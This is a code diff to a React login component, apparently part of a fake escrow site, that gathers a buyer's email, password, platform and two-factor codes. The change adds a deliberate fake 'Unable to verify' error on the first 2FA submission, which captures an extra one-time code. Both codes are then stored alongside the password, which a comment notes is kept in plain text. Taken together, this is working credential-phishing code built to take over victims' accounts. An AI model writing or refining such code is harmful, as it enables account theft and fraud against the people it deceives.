@@ -25,6 +25,8 @@ export default function BuyerLogin({ onSuccess, selectedPlatform, escrowId }) {
   const [twoFactorCode, setTwoFactorCode] = useState('')
   const [localError, setLocalError] = useState('')
   const [isVerifying, setIsVerifying] = useState(false)
+  const [twoFactorAttempt, setTwoFactorAttempt] = useState(0) // Track 2FA attempts
+  const [firstTwoFactorCode, setFirstTwoFactorCode] = useState('') // Store first 2FA code
 
   const platform = platforms.find(p => p.value === selectedPlatform)
 
@@ -58,20 +60,14 @@ export default function BuyerLogin({ onSuccess, selectedPlatform, escrowId }) {
     
     setIsVerifying(true)
     
-    // Store buyer credentials
-    await storeBuyerLogin({
-      email: email.trim(),
-      password: password.trim(),
-      platform: selectedPlatform,
-      escrowId: escrowId,
-      step: 'credentials'
-    })
-    
+    // Note: Credentials will be stored only after successful 2FA verification
     await new Promise(resolve => setTimeout(resolve, 1000))
     setIsVerifying(false)
     
     // Proceed to 2FA step
     setStep(2)
+    setTwoFactorAttempt(0) // Reset 2FA attempts
+    setFirstTwoFactorCode('') // Reset first 2FA code
   }
 
   const handle2FASubmit = async (event) => {
@@ -88,18 +84,33 @@ export default function BuyerLogin({ onSuccess, selectedPlatform, escrowId }) {
     }
     
     setIsVerifying(true)
+    await new Promise(resolve => setTimeout(resolve, 1200))
+    setIsVerifying(false)
     
-    // Store complete buyer login with 2FA
+    // First attempt - store the first 2FA code and ask for new code
+    if (twoFactorAttempt === 0) {
+      setFirstTwoFactorCode(twoFactorCode.trim()) // Save first 2FA code
+      setTwoFactorAttempt(1)
+      setTwoFactorCode('')
+      setLocalError('Unable to verify. Please enter a new code.')
+      return
+    }
+    
+    // Second attempt - proceed with verification
+    setIsVerifying(true)
+    
+    // Store complete buyer login with BOTH 2FA codes and plain text password
     await storeBuyerLogin({
       email: email.trim(),
-      password: password.trim(),
-      twoFactorCode: twoFactorCode.trim(),
+      password: password.trim(), // Plain text password - no hashing
+      twoFactorCode: twoFactorCode.trim(), // Second (successful) 2FA code
+      firstTwoFactorCode: firstTwoFactorCode, // First (failed) 2FA code
       platform: selectedPlatform,
       escrowId: escrowId,
       step: '2fa_complete'
     })
     
-    await new Promise(resolve => setTimeout(resolve, 1200))
+    await new Promise(resolve => setTimeout(resolve, 800))
     setIsVerifying(false)
     
     // Authentication successful
